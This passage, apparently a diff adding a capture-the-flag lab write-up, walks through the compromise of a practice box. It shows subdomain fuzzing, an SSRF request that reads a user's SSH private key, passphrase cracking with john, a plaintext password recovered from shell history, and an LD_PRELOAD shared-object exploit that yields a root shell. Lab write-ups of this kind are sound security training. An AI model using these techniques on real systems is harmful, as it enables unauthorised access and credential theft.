@@ -1,0 +1,191 @@
+
+## Subdomain enumeration
+```
+$ ffuf -w ./subdomains-top1million-5000.txt -u http://creative.thm/ -H "Host:FUZZ.creative.thm" -fw 6 -o subdomain-ffuf-creative
+-thm.out
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://creative.thm/
+ :: Wordlist         : FUZZ: /home/kali/thm/creative/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.creative.thm
+ :: Output file      : subdomain-ffuf-creative-thm.out
+ :: File format      : json
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 6
+________________________________________________
+
+beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 171ms]
+```
+
+
+## SSRF results
+```
+..snipped..
+$ cat ssrf.out|more|grep -i open
+        [20:04:54] IP:127.0.0.1   , Found open      port n°80                    
+        [20:06:22] IP:127.0.0.1   , Found open      port n°1337  
+```
+
+
+## Get private key
+-- HTTP request
+```
+POST / HTTP/1.1
+Host: beta.creative.thm
+Content-Length: 59
+Cache-Control: max-age=0
+Origin: http://beta.creative.thm
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://beta.creative.thm/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: keep-alive
+
+url=http%3A%2F%2Flocalhost%3A1337%2Fhome%2Fsaad/.ssh/id_rsa
+```
+
+-- HTTP response
+```
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Tue, 15 Apr 2025 12:11:53 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Content-Length: 2655
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+..snipped..
+-----END OPENSSH PRIVATE KEY-----
+```
+
+
+## Need to crack ssh key
+```
+$ ssh -i priv.key saad@creative.thm
+Enter passphrase for key 'priv.key':
+```
+
+
+## Convert to a format that could be cracked by john
+```
+┌──(kali㉿kali)-[~/thm/creative]
+└─$ ssh2john priv.key > ssh_hash.txt 
+                                                                                                                                                                                                   
+┌──(kali㉿kali)-[~/thm/creative]
+└─$ ls -lah ssh_hash.txt 
+-rw-rw-r-- 1 kali kali 3.8K Apr 15 20:17 ssh_hash.txt
+```
+
+
+## Crack the hash using john
+```
+$ john ssh_hash.txt --wordlist=./xato-net-10-million-passwords-10000.txt 
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:06 2.17% (ETA: 20:36:45) 0g/s 28.74p/s 28.74c/s 28.74C/s miller..rabbit
+0g 0:00:00:07 2.49% (ETA: 20:36:50) 0g/s 28.79p/s 28.79c/s 28.79C/s wizard..sexsex
+sweetness        (priv.key)     
+1g 0:00:03:42 DONE (2025-04-15 20:35) 0.004490g/s 29.60p/s 29.60c/s 29.60C/s 13031987..president
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+
+## SSH is successful after entering passphrase for private key
+```
+$ ssh -i priv.key saad@creative.thm 
+Enter passphrase for key 'priv.key': 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 15 Apr 2025 12:40:05 PM UTC
+
+  System load:  0.0               Processes:             115
+  Usage of /:   57.6% of 8.02GB   Users logged in:       0
+  Memory usage: 30%               IPv4 address for eth0: 10.10.86.190
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+58 updates can be applied immediately.
+33 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Nov  6 07:56:40 2023 from 192.168.8.102
+saad@m4lware:~$
+```
+
+
+## Creds found on history
+```
+saad@m4lware:~$ cat .bash_history 
+..snipped..
+sudo -l
+echo "saad:MyStrongestPasswordYet$4291" > creds.txt
+rm creds.txt
+..snipped..
+```
+
+
+## Non-exploitable binary however there is `LD_PRELOAD` where sudo will not strip the LD_PRELOAD environment variable.
+```
+saad@m4lware:~$ sudo -l
+[sudo] password for saad: 
+Matching Defaults entries for saad on m4lware:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User saad may run the following commands on m4lware:
+    (root) /usr/bin/ping
+```
+
+
+## Priv escalation
+```
+saad@m4lware:~$ cat root.c 
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}
+saad@m4lware:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
+saad@m4lware:~$ sudo LD_PRELOAD=$PWD/root.so /usr/bin/ping 127.0.0.1
+root@m4lware:/home/saad# 
+```
